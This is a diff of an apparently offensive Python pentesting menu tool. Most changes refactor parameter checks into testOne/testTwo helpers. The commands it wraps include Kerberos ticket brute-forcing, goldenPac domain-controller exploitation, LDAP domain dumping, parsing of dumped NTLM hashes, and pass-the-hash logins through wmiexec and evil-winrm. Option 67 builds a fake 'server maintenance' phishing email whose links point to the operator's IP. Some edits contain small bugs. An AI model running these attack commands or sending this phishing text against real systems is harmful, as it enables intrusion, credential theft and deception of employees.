@@ -1975,14 +1896,10 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      checkParams = 0
+      checkParams = testTwo(checkParams)
       
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
+      if USR[:2] == "''":
+         print("[*] Please enter a valid Username for enumeration...")
          checkParams = 1
 
       if checkParams != 1:
@@ -2006,6 +1923,7 @@ while True:
            
          if checkParams != 1:
             count = len(open('hashes.txt').readlines())
+            
             if count > 0:
                print("[*] Please wait, bruteforcing using " + str(count) + " found hashes...")
 
@@ -2017,8 +1935,9 @@ while True:
                      command("sed -i '1d' log2.tmp")
                      command("sed -i '1d' log2.tmp")
                         
-                     linecache.clearcache()
-                     checkFile2 = linecache.getline('log2.tmp', 1)
+                     with open("log2.tmp", "r") as read2:
+                        checkFile2 = read2.read()
+                     read2.close()
                                                
                      if "[*] Saving ticket in " in checkFile2:
                         print("[+] Saving ticket in " + USR.rstrip(" ") + ".ccache")
@@ -2057,15 +1976,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '48':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + "...\n")
@@ -2093,15 +2004,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + "...\n")
@@ -2128,19 +2031,14 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
-         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
-         command(keypath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command(keypath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
+         else:
+            command(keypath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2152,18 +2050,15 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='51':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
-         command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password credntial...")
+            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+         else:
+            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+            
          print("[*] Checking downloaded files: \n")
          command("ls -la ./" + DIR.rstrip(" "))
       prompt()
@@ -2177,11 +2072,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      checkParams = 0
-      
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
       
       if checkParams != 1:
          print ("[*] Enumerating, please wait...")     
@@ -2200,15 +2091,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          BH1 = input("[+] Enter Neo4j username: ")
@@ -2228,15 +2111,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
-      checkParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          print("Enumerating, please wait...\n")
@@ -2248,7 +2123,7 @@ while True:
          command("sed -i '/:::/!d' SECRETS.tmp")			# TIDY UP FILE READY FOR READING
          count = len(open('SECRETS.tmp').readlines())
 
-         cleanusers()         
+         cleanUsers()         
          for x in range(0, count):
             data = linecache.getline("SECRETS.tmp", x + 1)
             data = data.replace(":::","")				# DELETE THIS LINE?
@@ -2279,15 +2154,13 @@ while True:
             USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")		# STRIP ANY REMAINING DOMAIN NAME
             PASS[x] = get4[:COL4]         
             
-            if len(USER[x]) < COL1: USER[x] = padding(USER[x], COL3) 			# USER
-            if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD
+            if len(USER[x]) < COL1: USER[x] = spacePadding(USER[x], COL3) 			# USER
+            if len(PASS[x]) < COL4: PASS[x] = spacePadding(PASS[x], COL4) 			# PASSWORD
 
          for z in range(0, maximum):
             if USER[z].rstrip(" ") == USR.rstrip(" "):
                NTM = PASS[z]			# RESET DISPLAY HASH
-               if len(NTM) < COL1: NTM = padding(NTM, COL1)
-
-         os.remove("SECRETS.tmp")
+               if len(NTM) < COL1: NTM = spacePadding(NTM, COL1)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2299,11 +2172,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      checkParams = 0
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          if PAS[:2] != "''":
@@ -2347,15 +2216,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='56':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
@@ -2371,15 +2232,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
@@ -2395,16 +2248,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='58':
-      checkParams = 0
+      checkParams = testTwo(checkParams)
       
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
          command(keypath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
@@ -2418,9 +2263,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='59':
-      checkParams = 0
-      
+   if selection =='59':     
       print("[*] Checking work folder for relevant files...")
 
       if os.path.exists("./" + DIR.rstrip(" ") + "/ntds.dit"):
@@ -2451,11 +2294,11 @@ while True:
          
          for x in range (0, maximum):
             USER[x] = linecache.getline("usernames.txt", x + 1).rstrip("\n")
-            USER[x] = padding(USER[x], COL3)
+            USER[x] = spacePadding(USER[x], COL3)
          
          for x in range (0, maximum):
             PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip("\n")
-            PASS[x] = padding(PASS[x], COL4)
+            PASS[x] = spacePadding(PASS[x], COL4)
              
       prompt()
 
@@ -2489,11 +2332,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='61':
-      checkParams = 0
-   
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1   
+      checkParams = testOne(checkParams)
    
       if checkParams != 1:
          if WEB[:1] != "":
@@ -2512,7 +2351,7 @@ while True:
 
          for x in range (0,maximum):
             USER[x] = linecache.getline("usernames.txt", x+1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            if len(USER[x]) < COL3: USER[x] = spacePadding(USER[x], COL3)
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2524,12 +2363,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='62':
-      checkParams = 0  
+      checkParams = testOne(checkParams)  
    
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1   
-      
       if checkParams != 1:
          if WEB[:1] != "":
             command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + WEB.rstrip(" ") + " 2>&1")
@@ -2559,7 +2394,7 @@ while True:
       
       for x in range (0, maximum):
          USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-         USER[x] = padding(USER[x], COL3)
+         USER[x] = spacePadding(USER[x], COL3)
          
       prompt()
             
@@ -2576,7 +2411,7 @@ while True:
       
       for x in range (0, maximum):
          PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
-         PASS[x] = padding(PASS[x], COL4)     
+         PASS[x] = spacePadding(PASS[x], COL4)     
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2592,7 +2427,7 @@ while True:
            
       for x in range (0, maximum):
             PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
-            PASS[x] = padding(PASS[x], COL4)
+            PASS[x] = spacePadding(PASS[x], COL4)
             
       prompt()
 
@@ -2617,16 +2452,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='67':
-      checkParams = 0   
+      checkParams = testTwo(checkParams)
 
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-         
-      if DOM[:5] == "EMPTY":
-         print("[-] Remote mail.server has not been specified...")
-         checkParams = 1
-      
       if "25" not in POR:
          print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour4))
          checkParams = 1
@@ -2640,9 +2467,9 @@ while True:
          command('echo "Hello.\n" > body.tmp')
          command('echo "We just performed maintenance on our servers." >> body.tmp')
          command('echo "Please verify if you can still access the login page:\n" >> body.tmp')
-         command('echo "\t  <img src=\""' + localip + '"/img\">" >> body.tmp')
-         command('echo "\t  Citrix http://"' + localip + '"/" >> body.tmp')
-         command('echo "  <a href=\"http://"' + localip + '"\">click me.</a>" >> body.tmp')
+         command('echo "\t  <img src=\""' + localIP + '"/img\">" >> body.tmp')
+         command('echo "\t  Citrix http://"' + localIP + '"/" >> body.tmp')
+         command('echo "  <a href=\"http://"' + localIP + '"\">click me.</a>" >> body.tmp')
 
          command('echo "\nRegards," >> body.tmp')
          command('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')
@@ -2706,9 +2533,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='68':
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-      else:
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          if WEB[:5] == "EMPTY":
             command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
          else:
@@ -2727,21 +2554,18 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='69':
-      checkParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-         
-      if ":" in TIP:
-         print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
-         checkParams = 1         
-         
+      checkParams = testOne(checkParams)
+
       if checkParams != 1:
-         if WEB[:5] != "EMPTY":
-            command("nikto -h " + WEB.rstrip(" "))
-         else:
-            command("nikto -h " + TIP.rstrip(" "))
+         if ":" in TIP:
+            print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
+#            checkParams = 1         
+         
+         if checkParams != 1:
+            if WEB[:5] != "EMPTY":
+               command("nikto -h " + WEB.rstrip(" "))
+            else:
+               command("nikto -h " + TIP.rstrip(" "))
       prompt()  
       
 # ------------------------------------------------------------------------------------- 
@@ -2753,11 +2577,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='70':
-      checkParams = 0   
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testOne(checkParams)
          
       if checkParams != 1:
          if os.path.getsize("usernames.txt") == 0:
@@ -2785,7 +2605,7 @@ while True:
          
          for x in range (0,maximum):
             USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            if len(USER[x]) < COL3: USER[x] = spacePadding(USER[x], COL3)
             
       prompt() 
       
@@ -2798,11 +2618,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='71':
-      checkParams = 0   
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testOne(checkParams)
          
       if checkParams != 1:
          if os.path.getsize("usernames.txt") == 0:
@@ -2830,7 +2646,7 @@ while True:
          
          for x in range (0,maximum):
             USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            if len(USER[x]) < COL3: USER[x] = spacePadding(USER[x], COL3)
             
       prompt()
 
@@ -2843,12 +2659,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='72':
-      checkParams = 0   
+      checkParams = testOne(checkParams)
 
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-         
       if checkParams != 1:
          if os.path.getsize("usernames.txt") == 0:
             print("[-] Username file is empty...")
@@ -2875,7 +2687,7 @@ while True:
          
          for x in range (0,maximum):
             USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            USER[x] = padding(USER[x], COL3)
+            USER[x] = spacePadding(USER[x], COL3)
             
       prompt() 
 
@@ -2888,11 +2700,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='73':
-      checkParams = 0   
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testOne(checkParams)
          
       if checkParams != 1:
          if os.path.getsize("usernames.txt") == 0:
@@ -2923,7 +2731,7 @@ while True:
                
          for x in range (0,maximum):
             USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            if len(USER[x]) < COL3: USER[x] = spacePadding(USER[x], COL3)
             
       prompt()
       
@@ -2964,7 +2772,7 @@ while True:
                           
          for x in range (0,maximum):
             USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            if len(USER[x]) < COL3: USER[x] = spacePadding(USER[x], COL3)
             
       prompt()
       
@@ -3010,10 +2818,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='76':
-      if "873" in POR:
-         command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
-      else:
-         print("[-] Port 873 not found in LIVE PORTS...")
+      checkParams = testOne(checkParams)
+   
+      if checkParams != 1:
+         if "873" in POR:
+            command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
+         else:
+            print("[-] Port 873 not found in LIVE PORTS...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3025,10 +2836,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='77':
-      if "873" in POR:
-         command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")
-      else:
-         print("[-] Port 873 not found in LIVE PORTS...")      
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
+         if "873" in POR:
+            command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")
+         else:
+            print("[-] Port 873 not found in LIVE PORTS...")      
       prompt()   
       
 # ------------------------------------------------------------------------------------- 
@@ -3040,7 +2854,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='78':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+   
+      if checkParams != 1:
          command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
       prompt()
       
@@ -3053,7 +2869,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '79':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
       prompt()  
       
@@ -3066,7 +2884,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='80':
-      if TIP[:5] != "EMPTY":
+      checkparams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("ftp " + TIP.rstrip(" ") + " 21")
       prompt()       
       
@@ -3079,7 +2899,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='81':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " -p 22")
       prompt() 
 
@@ -3092,7 +2914,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='82':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
       prompt()
       
@@ -3105,7 +2929,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='83':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " 23")
       prompt()
       
@@ -3118,7 +2944,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='84':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("nc " + TIP.rstrip(" ") + " 80")
       prompt()
       
@@ -3131,7 +2959,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='85':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
       prompt()
 
@@ -3144,11 +2974,12 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='86':
-      if TIP[:5] != "EMPTY":
-         if DOM[:5] != "EMPTY":
-            command(keypath + "mssqlclient.py " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
-         else:
-            command(keypath + "mssqlclient.py " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      checkParams = testTwo(checkParams)
+   
+      if checkParams != 1:
+          command(keypath + "mssqlclient.py " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      else:
+          command(keypath + "mssqlclient.py " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3160,7 +2991,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='87':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
       prompt() 
 
@@ -3173,25 +3006,14 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='88':
-      checkParams = 0      
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP has not been specified...")
-         checkParams = 1
-         
-      if PAS.rstrip(" ") == "''":
-         print("[-] Password has not been specified...")
-         checkParams = 1   
-   
-      if checkParams == 1:
-         if (NTM[:5] != "EMPTY") and (TIP[:5] != "EMPTY"):      
-            print("[*] Using the HASH value as a login credential...")
-            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "'")
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:            
+         if NTM[:5] != "EMPTY":
+            print("[i] Using the HASH value as a password credential...")
+            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" "))
          else:
-            if (NTM[:5] == "EMPTY") or (NTM[:1] == "."):
-               print("[-] Hash value has not been specified...")
-                    
-      if checkParams == 0:
-         command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
+            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
       prompt() 
                  
 # ------------------------------------------------------------------------------------- 
@@ -3205,6 +3027,7 @@ while True:
    if selection == '89':
       if os.path.exists("config.txt"):
          os.remove("config.txt")				# DELETE OLD CONFIG FILE
+         
       command("touch config.txt")				# CREATE NEW CONFIG FILE
       command("echo " + DNS + " >> config.txt")
       command("echo " + TIP + " >> config.txt")
